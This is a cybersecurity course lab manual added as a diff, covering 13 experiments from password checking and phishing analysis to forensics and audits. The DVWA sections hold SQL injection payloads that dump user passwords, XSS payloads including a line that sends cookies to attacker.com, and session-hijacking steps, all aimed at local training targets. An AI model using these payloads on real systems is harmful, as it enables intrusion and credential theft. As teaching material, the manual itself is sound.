@@ -1,0 +1,558 @@
+================================================================================
+     CYBER SECURITY LAB - ALL EXPERIMENTS: COMMANDS, CODES & PROCEDURES
+================================================================================
+
+
+================================================================================
+EXP 1 — PASSWORD STRENGTH TESTING USING PYTHON
+================================================================================
+
+PROGRAM (p1.py):
+----------------
+import re
+
+def password_strength_checker(password):
+    if(len(password)<8):
+        return "Weak:password should contain atleast 8 length"
+    if not any(ch.isdigit() for ch in password):
+        return "Weak:password should contain atleast 1 digit"
+    if not any(ch.islower() for ch in password):
+        return "Weak:password should contain atleast 1 lower"
+    if not any(ch.isupper() for ch in password):
+        return "Weak:password should contain atleast 1 upper"
+    if not re.search(r'[!@#$%^&*(){}<>,.|]',password):
+        return "Medium:Not special character"
+    return "Strong password"
+
+def run():
+    while True:
+        input1=input("Enter your password or exit to exit");
+        if(input1.lower()=="exit"):
+            return "exited"
+            break
+        print(password_strength_checker(input1));
+
+run();
+
+RUN COMMAND:
+------------
+python p1.py
+
+SAMPLE INPUT/OUTPUT:
+--------------------
+Input: abc123       → Weak:password should contain atleast 8 length
+Input: Abcdef12     → Medium:Not special character
+Input: Abc@1234     → Strong password
+
+
+================================================================================
+EXP 2 — ANALYZING PHISHING EMAILS
+================================================================================
+
+TOOLS:
+------
+- EML Analyzer  → https://eml-analyzer.herokuapp.com
+- VirusTotal    → https://www.virustotal.com
+- Sample file   → 2020-05-05-phishing-email-example-01.eml
+
+STEPS:
+------
+1. Upload .eml file to EML Analyzer online tool
+2. Note: sender email, domain, IP, SPF/DKIM/DMARC results
+3. Check sender IP on VirusTotal: https://www.virustotal.com/gui/ip-address/<IP>
+4. Check email breach: https://haveibeenpwned.com
+
+FINDINGS FROM SAMPLE FILE:
+---------------------------
+Sender Email  : sues@nnwifi.com
+Domain        : nnwifi.com
+Sender IP     : 94.100.31.27
+IP Blacklisted: Yes (1/93 vendors on VirusTotal)
+SPF           : FAIL
+DKIM          : Not signed
+DMARC         : Not aligned
+Suspicious URL: https://servervirto.com.co/ed/trn/update?email=...
+
+VERDICT: PHISHING EMAIL
+
+
+================================================================================
+EXP 3 — PACKET SNIFFING AND NETWORK TRAFFIC ANALYSIS
+================================================================================
+
+TOOLS: Kali Linux, Python HTTP Server, tcpdump, Wireshark
+
+STEP 1 — START LOCAL HTTP SERVER (port 8080):
+----------------------------------------------
+python3 -m http.server 8080
+
+STEP 2 — START PACKET CAPTURE:
+--------------------------------
+sudo tcpdump -i any -w capture.pcap port 8080
+
+STEP 3 — GENERATE TRAFFIC:
+----------------------------
+Open Firefox → go to http://localhost:8080 → refresh multiple times
+
+STEP 4 — STOP CAPTURE & OPEN IN WIRESHARK:
+--------------------------------------------
+# Stop: Ctrl + C
+wireshark capture.pcap
+
+STEP 5 — FILTER IN WIRESHARK:
+-------------------------------
+http.request.method == "GET"
+http.request.method == "POST"
+http
+tcp.port == 8080
+
+STEP 6 — ANALYZE PACKET DETAILS:
+----------------------------------
+- Click any packet → view browser details, visited URLs, HTTP headers
+- If POST submitted: username & password visible in plain text → HTTP is INSECURE
+
+
+================================================================================
+EXP 4 — NETWORK FORENSICS USING WIRESHARK
+================================================================================
+
+TOOLS: Kali Linux, Wireshark
+
+STEP 1 — LAUNCH WIRESHARK:
+----------------------------
+wireshark &
+# Select interface: eth0
+
+STEP 2 — PROTOCOL FILTERS:
+----------------------------
+tcp
+udp
+http
+tls
+dns
+
+STEP 3 — IP ADDRESS FILTERS:
+------------------------------
+ip.addr == 192.168.0.161
+ip.src  == 192.168.0.161
+ip.dst  == 192.168.0.161
+
+STEP 4 — FOLLOW TCP STREAM:
+-----------------------------
+Right-click any TCP packet → Follow → TCP Stream
+
+STEP 5 — DETECT PORT SCANNING:
+--------------------------------
+# Run nmap from another terminal:
+nmap -sS 192.168.0.156
+
+# Wireshark filter to detect SYN scan:
+tcp.flags.syn == 1 && tcp.flags.ack == 0
+
+STEP 6 — STATISTICS MENU:
+---------------------------
+Statistics → Capture File Properties
+Statistics → Protocol Hierarchy Statistics
+Statistics → Conversations
+Statistics → Endpoints
+Statistics → I/O Graphs
+
+
+================================================================================
+EXP 5 — SQL INJECTION ATTACK (DVWA via Docker)
+================================================================================
+
+TOOLS: Windows, Docker Desktop, Firefox
+
+SETUP — RUN DVWA IN DOCKER:
+-----------------------------
+docker run --rm -it -p 80:80 vulnerables/web-dvwa
+
+# Open browser: http://localhost/dvwa
+# Login: admin / password
+# Click: Create / Reset Database
+# Set Security Level: LOW
+
+NAVIGATE TO SQL INJECTION:
+---------------------------
+DVWA → Vulnerabilities → SQL Injection
+
+STEP 1 — NORMAL INPUT:
+------------------------
+1
+# Result: Shows user details for ID 1
+
+STEP 2 — AUTHENTICATION BYPASS:
+---------------------------------
+1' OR '1'='1
+# Result: ALL user records displayed
+
+STEP 3 — FIND NUMBER OF COLUMNS:
+----------------------------------
+1' ORDER BY 1-- -
+1' ORDER BY 2-- -
+1' ORDER BY 3-- -
+# Stop when error appears; last successful = total columns
+
+STEP 4 — UNION-BASED INJECTION:
+---------------------------------
+1' UNION SELECT 1,2-- -
+
+STEP 5 — EXTRACT DATABASE NAME:
+---------------------------------
+1' UNION SELECT database(),2-- -
+
+STEP 6 — EXTRACT TABLE NAMES:
+-------------------------------
+1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()-- -
+
+STEP 7 — EXTRACT COLUMN NAMES:
+--------------------------------
+1' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'-- -
+
+STEP 8 — EXTRACT USERNAMES & PASSWORDS:
+-----------------------------------------
+1' UNION SELECT user,password FROM users-- -
+# Passwords appear as MD5 hashes
+
+
+================================================================================
+EXP 6 — XSS (CROSS-SITE SCRIPTING)
+================================================================================
+
+TOOLS: Kali Linux, DVWA, Firefox. Setup same as SQL Injection.
+
+NAVIGATE:
+----------
+DVWA → Vulnerabilities → XSS (Reflected / Stored / DOM)
+
+REFLECTED XSS TESTS:
+---------------------
+<script>alert('XSS')</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror=alert('XSS')>
+<body onload=alert('XSS')>
+
+STORED XSS:
+------------
+<script>alert('Stored XSS')</script>
+<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
+
+DOM-BASED XSS:
+---------------
+# Inject in URL parameter:
+http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=<script>alert('DOM XSS')</script>
+
+
+================================================================================
+EXP 7 — AUTHENTICATION WEAKNESSES & SESSION MANAGEMENT
+================================================================================
+
+TOOLS: Kali Linux, DVWA, Firefox
+
+PART A — BRUTE FORCE ATTACK:
+------------------------------
+# Navigate to: DVWA → Vulnerabilities → Brute Force
+
+Username: admin  Password: admin     → FAIL
+Username: admin  Password: 123456    → FAIL
+Username: admin  Password: password  → SUCCESS
+# No lockout = Brute Force Vulnerability
+
+PART B — SESSION ID ANALYSIS:
+-------------------------------
+Right-click → Inspect → Storage → Cookies → note PHPSESSID (visible, not encrypted)
+
+PART C — SESSION HIJACKING:
+-----------------------------
+1. Login → copy PHPSESSID from DevTools → Storage → Cookies
+2. Open Private Window (Ctrl+Shift+P) — do NOT login
+3. DevTools → Storage → Cookies → paste PHPSESSID → F5
+4. Result: Logged in as admin WITHOUT password → Session Hijacking
+
+PART D — SESSION FIXATION:
+----------------------------
+1. Note PHPSESSID before login
+2. Login → check PHPSESSID after login
+   LOW security : PHPSESSID SAME before/after → Session Fixation
+   HIGH security: PHPSESSID CHANGES after login → Secure
+
+PART E — IMPROPER LOGOUT:
+---------------------------
+1. Login → copy PHPSESSID → Logout
+2. Open Private Window → paste old PHPSESSID → http://127.0.0.1/dvwa/index.php
+3. Result (LOW): Still logged in — logout did NOT destroy session
+
+OBSERVATIONS TABLE:
+--------------------
+Test Case               | Result
+------------------------|--------------------------------
+Weak Password Login     | Successful
+Brute Force Attack      | Allowed (no lockout)
+Session ID Exposure     | Found (plaintext)
+Session Hijacking       | Possible
+Session Fixation        | Observed (LOW level)
+Improper Logout         | Session reusable after logout
+
+
+================================================================================
+EXP 8 — ANDROID APP PERMISSIONS & MOBILE TRAFFIC ANALYSIS
+================================================================================
+
+TOOLS: Android Studio, AVD, Burp Suite, ADB, Chrome
+
+STEP 1 — START AVD WITH PROXY:
+--------------------------------
+cd C:\Users\Admin\AppData\Local\Android\Sdk\emulator
+emulator -list-avds
+emulator -avd Pixel_9 -http-proxy http://10.0.2.2:8080
+
+STEP 2 — SET PROXY VIA ADB:
+-----------------------------
+cd C:\Users\Admin\AppData\Local\Android\Sdk\platform-tools
+adb devices
+adb shell settings put global http_proxy 10.0.2.2:8080
+adb shell settings get global http_proxy    # Expected: 10.0.2.2:8080
+
+STEP 3 — CONFIGURE BURP SUITE:
+--------------------------------
+Proxy → Options → Proxy Listeners → Edit → All Interfaces → OK
+Enable: Intercept ON
+
+STEP 4 — EXPORT & INSTALL BURP CA CERTIFICATE:
+------------------------------------------------
+# In Burp Suite:
+Proxy → Options → Import/Export CA Certificate → DER → save as burpcer.der
+
+# Push to AVD:
+adb push C:\Users\Admin\Downloads\burpcer.der /sdcard/Download/
+
+# Install in AVD:
+Settings → Security → Encryption & Credentials → Install Certificate → CA Certificate
+
+STEP 5 — VERIFY HTTPS INTERCEPTION:
+-------------------------------------
+# In AVD Chrome: visit https://example.com
+# Check Burp Proxy → HTTP History
+
+STEP 6 — ANALYZE APP PERMISSIONS (EXODUS PRIVACY):
+----------------------------------------------------
+# Open: https://reports.exodus-privacy.eu.org
+# Search: WhatsApp
+# Note trackers: Google Analytics, Crashlytics, Facebook Analytics
+
+
+================================================================================
+EXP 9 — IOT DEVICE SECURITY (DEFAULT PASSWORDS & OPEN PORTS)
+================================================================================
+
+TOOLS: Windows, Docker Desktop, OWASP Juice Shop, Kali Linux, Nmap
+
+STEP 1 — DEPLOY JUICE SHOP ON WINDOWS:
+----------------------------------------
+docker run -d -p 8090:3000 --name juiceshop bkimminich/juice-shop
+# Access at: http://localhost:8090
+
+STEP 2 — FIND HOST IP:
+------------------------
+ipconfig
+# Note IPv4 address (e.g., 192.168.0.148)
+
+STEP 3 — SCAN FROM KALI LINUX:
+--------------------------------
+nmap -sV 192.168.0.148
+# Performs port scan, service/version detection, banner grabbing
+
+STEP 4 — TEST DEFAULT CREDENTIALS:
+-------------------------------------
+# Navigate to: http://localhost:8090 → Login
+# Try: admin@juice-sh.op / admin123
+# Successful login = Default Password Vulnerability confirmed
+
+STEP 5 — INSPECT UNENCRYPTED TRAFFIC:
+---------------------------------------
+F12 → Network tab → All HTTP requests visible in plain text
+
+VULNERABILITIES IDENTIFIED:
+-----------------------------
+1. Open Port 8090 → HTTP service exposed
+2. Service version visible → enables targeted exploits
+3. Unencrypted HTTP → data in plain text
+4. Weak/default credentials → no lockout
+5. Information disclosure via banner
+
+
+================================================================================
+EXP 10 — DISK IMAGING AND FORENSIC ANALYSIS (dc3dd + Autopsy)
+================================================================================
+
+TOOLS: Kali Linux, dc3dd, Autopsy
+
+STEP 1 — CREATE EVIDENCE FILE:
+--------------------------------
+echo "Cybersecurity Lab Evidence" > evidence.txt
+lsblk    # Identify disk partition
+
+STEP 2 — CREATE FORENSIC DISK IMAGE:
+--------------------------------------
+dd if=/dev/zero of=practice_disk.dd bs=1M count=100
+mkfs.ext4 practice_disk.dd
+
+# Using dc3dd:
+dc3dd if=/dev/sda1 of=/home/kali/disk_image.dd hash=md5 log=/home/kali/acquisition.log
+
+# Verify:
+ls -lh /home/kali/disk_image.dd
+cat /home/kali/acquisition.log
+
+STEP 3 — START AUTOPSY:
+------------------------
+autopsy
+# Open: http://localhost:9999/autopsy
+
+STEP 4 — CREATE NEW CASE IN AUTOPSY:
+--------------------------------------
+1. Click 'Create New Case' → enter case details
+2. Add Host → Add Image → browse to /home/kali/disk_image.dd
+3. Click Next → Autopsy analyzes the image
+
+STEP 5 — ANALYZE EVIDENCE:
+----------------------------
+File Analysis   → view files and directories
+Keyword Search  → search for specific terms
+Deleted Files   → recover deleted items
+File Type Sort  → sort by type
+
+
+================================================================================
+EXP 11 — FILE ANALYSIS FOR INCIDENT DETECTION (Log Analysis)
+================================================================================
+
+TOOLS: Kali Linux, journalctl, grep, awk, sort, lastb
+
+LOG DIRECTORY:
+---------------
+cd /var/log && ls
+# Key files: dpkg.log, apache2/, journal/, wtmp, btmp
+
+KEY COMMANDS:
+--------------
+last                                           # Successful logins
+journalctl | grep "Failed"                     # Failed SSH attempts
+journalctl | grep ssh                          # SSH activity
+journalctl | grep -i error                     # Error detection
+sudo less /var/log/apache2/access.log
+grep "404" /var/log/apache2/access.log         # Detect probing
+sudo journalctl -f                             # Real-time monitoring
+
+SIMULATE & ANALYZE FAILED SSH LOGINS:
+---------------------------------------
+sudo apt install openssh-server -y
+sudo service ssh start
+
+# Generate failed attempts:
+ssh fakeuser@localhost    # enter wrong password multiple times
+
+# Analyze:
+journalctl | grep "Failed password"
+journalctl | grep "Failed password" | awk '{print $11}'
+journalctl | grep "Failed password" | awk '{print $11}' | sort | uniq -c | sort -nr
+journalctl --since "10 minutes ago"
+sudo lastb
+
+QUICK CHECKLIST:
+-----------------
+Check           | Command                        | Suspicious If
+----------------|--------------------------------|----------------------
+Failed logins   | lastb                          | Many attempts
+SSH activity    | journalctl | grep ssh          | Unknown connections
+Login history   | last                           | Odd timing/unknown IP
+Errors          | journalctl | grep error        | Repeated errors
+Web logs        | grep 404 access.log            | Many failed requests
+
+
+================================================================================
+EXP 12 — PRIVACY AUDIT OF APPS & WEBSITES
+================================================================================
+
+TOOLS: Kali Linux, Wireshark, Burp Suite, Node.js, Nativefier
+
+SETUP:
+-------
+sudo apt install nodejs npm -y
+sudo npm install -g nativefier
+nativefier https://web.whatsapp.com
+cd WhatsAppWeb-linux-x64 && ./WhatsAppWeb
+
+PART 1 — WHATSAPP TRACKER ANALYSIS (EXODUS PRIVACY):
+------------------------------------------------------
+# Open: https://reports.exodus-privacy.eu.org → Search: WhatsApp
+# Record trackers found
+
+# Wireshark capture:
+wireshark    # interface: eth0 or wlan0
+# Filters: tls   dns
+# Observations: traffic TLS encrypted, domains: whatsapp.net, facebook.com
+# Message content NOT visible; metadata visible
+
+PART 2 — FACEBOOK PRIVACY VIA BURP SUITE:
+-------------------------------------------
+burpsuite
+# Browser proxy: 127.0.0.1:8080
+# Intercept ON → reload Facebook
+# Look for cookies: datr, fr (tracking cookies), session IDs
+# F12 → Network tab: ads analytics, third-party requests, tracking pixels
+
+PART 3 — EMAIL BREACH CHECK:
+------------------------------
+# Go to: https://haveibeenpwned.com → enter email
+
+DATA BREACH CASES:
+-------------------
+Facebook 2021   : 533M users, phone/email/name leaked via API vulnerability
+WhatsApp Pegasus: spyware via missed call (zero-click), buffer overflow in VoIP
+
+
+================================================================================
+EXP 13 — SECURITY AUDIT AND RISK ASSESSMENT (Windows)
+================================================================================
+
+KEY CMD COMMANDS:
+------------------
+msinfo32                             # System information
+netstat -an                          # Open ports
+netstat -b                           # Active connections
+netsh advfirewall show allprofiles   # Firewall status
+net user                             # List user accounts
+systeminfo                           # System info
+
+CHECKLIST STEPS:
+-----------------
+1. Settings → Windows Update → Check for updates
+2. Windows Defender Firewall → Verify ON
+3. Windows Security → Virus & Threat Protection → Real-time: ON, Last scan: Recent
+4. Settings → Accounts → Sign-in options → Password/PIN/Hello enabled
+5. Settings → Apps → Installed apps → Remove unknown/cracked software
+6. Task Manager (Ctrl+Shift+Esc) → Startup → Disable unnecessary apps
+7. Settings → Network & Internet → Type: Private (recommended)
+8. Browser → Settings → Privacy → Safe Browsing ON, remove unknown extensions
+9. Backup settings → OneDrive backup configured
+
+RISK ASSESSMENT TABLE:
+-----------------------
+Asset          | Threat               | Vulnerability  | Risk   | Solution
+---------------|----------------------|----------------|--------|--------------------
+Personal Files | Data Loss            | No Backup      | High   | Enable OneDrive
+System         | Malware              | Unknown Apps   | High   | Remove apps
+Network        | Hacking              | Public Network | Medium | Switch to Private
+Account        | Unauthorized Access  | Weak Password  | High   | Use strong password
+
+
+================================================================================
+END OF DOCUMENT
+================================================================================
+Total Experiments: 13
+Topics: Password Security, Phishing, Packet Sniffing, Wireshark, SQL Injection,
+        XSS, Session Management, Android Security, IoT Security, Disk Forensics,
+        Log Analysis, Privacy Audit, Security Audit
+================================================================================
